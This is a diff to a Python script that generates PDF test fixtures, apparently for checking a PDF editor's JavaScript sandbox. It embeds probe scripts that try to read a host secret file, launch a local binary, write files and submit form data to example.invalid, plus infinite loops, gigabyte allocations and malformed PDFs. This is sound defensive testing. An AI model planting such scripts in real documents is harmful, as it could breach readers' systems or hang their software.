@@ -1,6 +1,8 @@
 #!/usr/bin/env python3
 # SPDX-License-Identifier: GPL-3.0-only
 """Generate deterministic, original PDF fixtures without a PDF dependency."""
+from __future__ import annotations
+
 from pathlib import Path
 import xml.etree.ElementTree as ET
 
@@ -44,10 +46,10 @@ def viewer_pdf(page_count: int) -> bytes:
     return pdf(objects)
 
 
-def acroform_controls() -> bytes:
+def acroform_controls(script: str | None = None, save_script: str | None = None, cyclic: bool = False) -> bytes:
     def appearance(data: bytes) -> bytes:
         return f"<< /Type /XObject /Subtype /Form /BBox [0 0 20 20] /Resources << >> /Length {len(data)} >>\nstream\n".encode()+data+b"\nendstream"
-    return pdf([
+    objects = [
         b"<< /Type /Catalog /Pages 2 0 R /AcroForm 5 0 R >>",
         b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
         b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 4 0 R >> >> /Contents 12 0 R /Annots [6 0 R 7 0 R 9 0 R 10 0 R 11 0 R] /Tabs /R >>",
@@ -62,7 +64,87 @@ def acroform_controls() -> bytes:
         stream(b"BT /F1 20 Tf 72 750 Td (AcroForm controls) Tj ET BT /F1 12 Tf 100 638 Td (Checkbox) Tj ET BT /F1 12 Tf 100 576 Td (A) Tj ET BT /F1 12 Tf 170 576 Td (B) Tj ET"),
         appearance(b"q 1 w 0 G 1 1 18 18 re S Q"),
         appearance(b"q 1 w 0 G 1 1 18 18 re S 0 g 5 5 10 10 re f Q"),
+    ]
+    if cyclic:
+        objects[7] = b"<< /FT /Btn /Ff 32768 /T (Choice) /V /A /Kids [8 0 R] >>"
+    if script is not None:
+        objects[0] = objects[0].replace(b" >>", b" /Names << /JavaScript << /Names [(safety) 15 0 R] >> >> >>")
+        objects.extend([b"<< /S /JavaScript /JS 16 0 R >>", stream(script.encode())])
+    if save_script is not None:
+        assert script is None
+        objects[0] = objects[0].replace(b" >>", b" /AA << /WS 15 0 R >> >>")
+        objects.extend([b"<< /S /JavaScript /JS 16 0 R >>", stream(save_script.encode())])
+    return pdf(objects)
+
+
+def xfa_pdf(xml: bytes) -> bytes:
+    return pdf([
+        b"<< /Type /Catalog /Pages 2 0 R /AcroForm 4 0 R /NeedsRendering true /Extensions << /ADBE << /BaseVersion /1.7 /ExtensionLevel 8 >> >> >>",
+        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
+        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << >> >>",
+        b"<< /XFA 5 0 R /Fields [] >>",
+        stream(xml),
     ])
+
+
+def many_pages_pdf(count: int = 1000, padding: int = 0) -> bytes:
+    kids = " ".join(f"{5 + index} 0 R" for index in range(count))
+    objects = [b"<< /Type /Catalog /Pages 2 0 R >>",
+               f"<< /Type /Pages /Kids [{kids}] /Count {count} >>".encode(),
+               stream(b"BT /F1 20 Tf 72 720 Td (Large safety fixture) Tj ET"),
+               b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>"]
+    objects.extend(b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 4 0 R >> >> /Contents 3 0 R >>" for _ in range(count))
+    if padding:
+        objects.append(stream(b"P" * padding))
+    return pdf(objects)
+
+
+SAFETY_SCRIPT = """
+var audit = ["ran"];
+var names = ["process", "require", "Deno", "fetch", "XMLHttpRequest", "getenv", "system"];
+for (var i = 0; i < names.length; ++i) audit.push(names[i] + ":" + eval("typeof " + names[i]));
+try { util.readFileIntoStream("/tmp/pdf-editor-host-secret"); audit.push("read:returned"); }
+catch(e) { audit.push("read:blocked"); }
+try { app.launchURL("file:///usr/bin/true"); audit.push("launch:attempted"); }
+catch(e) { audit.push("launch:blocked"); }
+try { this.saveAs("/tmp/pdf-editor-host-write"); audit.push("write:attempted"); }
+catch(e) { audit.push("write:blocked"); }
+try { this.submitForm({cURL:"http://example.invalid/safety", aFields:["Input"]}); audit.push("network:attempted"); }
+catch(e) { audit.push("network:blocked"); }
+this.getField("Input").value = audit.join("|");
+"""
+
+
+def safety_fixtures() -> dict[str, bytes]:
+    xml = (ROOT / "tests/pdfs/xfa-dynamic/controls.xdp").read_text()
+    # Preserve a value set before a script exception, proving execution occurred.
+    def xfa_script(script: str) -> bytes:
+        start = xml.index('<event activity="initialize">')
+        end = xml.index('</event>', start) + len('</event>')
+        event = '<event activity="initialize"><script contentType="application/x-javascript"><![CDATA[' + script + ']]></script></event>'
+        return xfa_pdf((xml[:start] + event + xml[end:]).encode())
+    xfa_audit = SAFETY_SCRIPT[:SAFETY_SCRIPT.index('try { this.saveAs')]
+    xfa_audit += '\ntry { xfa.host.gotoURL("http://example.invalid/safety"); audit.push("network:attempted"); } catch(e) { audit.push("network:blocked"); }\nthis.rawValue = audit.join("|");'
+    return {
+        "cyclic-acroform.pdf": acroform_controls(cyclic=True),
+        "extreme-page.pdf": pdf([b"<< /Type /Catalog /Pages 2 0 R >>", b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>", b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1 14400] /Resources << >> >>"]),
+        "tiny-page.pdf": pdf([b"<< /Type /Catalog /Pages 2 0 R >>", b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>", b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 0.1 1] /Resources << >> >>"]),
+        "corrupted.pdf": b"%PDF-1.7\n1 0 obj << /Type /Catalog /Pages 999 0 R >>\nendobj\n%%EOF\n",
+        "broken-xfa.pdf": xfa_pdf(b'<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/"><template><broken>'),
+        "host-access-acroform.pdf": acroform_controls(SAFETY_SCRIPT),
+        "host-access-xfa.pdf": xfa_script(xfa_audit),
+        "throw-acroform.pdf": acroform_controls('this.getField("Input").value = "ran-before-error"; throw new Error("synthetic failure");'),
+        "throw-xfa.pdf": xfa_script('this.rawValue = "ran-before-error"; throw new Error("synthetic failure");'),
+        "loop-acroform.pdf": acroform_controls('while (true) {}'),
+        "loop-xfa.pdf": xfa_script('while (true) {}'),
+        "many-pages.pdf": many_pages_pdf(),
+        "save-loop-acroform.pdf": acroform_controls(save_script='while (true) {}'),
+        "exit-loop-xfa.pdf": xfa_pdf(xml.replace('calculated.rawValue = "JS:" + this.rawValue;', 'while (true) {}').encode()),
+        "stress-acroform.pdf": acroform_controls('var n = 0; for(var i=0;i<100000;++i) n += i; this.getField("Input").value = "sum:" + n;'),
+        "memory-acroform.pdf": acroform_controls('if (typeof Uint8Array !== "function") { this.getField("Input").value = "memory:unavailable"; } else try { var bytes = new Uint8Array(1024*1024*1024); this.getField("Input").value = "memory:allowed"; } catch(e) { this.getField("Input").value = "memory:blocked"; }'),
+        "memory-xfa.pdf": xfa_script('if (typeof Uint8Array !== "function") { this.rawValue = "memory:unavailable"; } else try { var bytes = new Uint8Array(1024*1024*1024); this.rawValue = "memory:allowed"; } catch(e) { this.rawValue = "memory:blocked"; }'),
+        "stress-xfa.pdf": xfa_script('var n = 0; for(var i=0;i<100000;++i) n += i; this.rawValue = "sum:" + n;'),
+    }
 
 
 def generate(output_root: Path = ROOT) -> None:
@@ -70,6 +152,10 @@ def generate(output_root: Path = ROOT) -> None:
     output_fixture = output_root / fixture.relative_to(ROOT)
     for category in ("xfa-javascript", "normal", "malformed", "acroform", "xfa-dynamic"):
         (output_root / "tests/pdfs" / category).mkdir(parents=True, exist_ok=True)
+    safety = output_root / "tests/pdfs/safety"
+    safety.mkdir(parents=True, exist_ok=True)
+    for name, content in safety_fixtures().items():
+        (safety / name).write_bytes(content)
     document = pdf([
         b"<< /Type /Catalog /Pages 2 0 R /AcroForm 4 0 R /NeedsRendering true "
         b"/Extensions << /ADBE << /BaseVersion /1.7 /ExtensionLevel 8 >> >> >>",
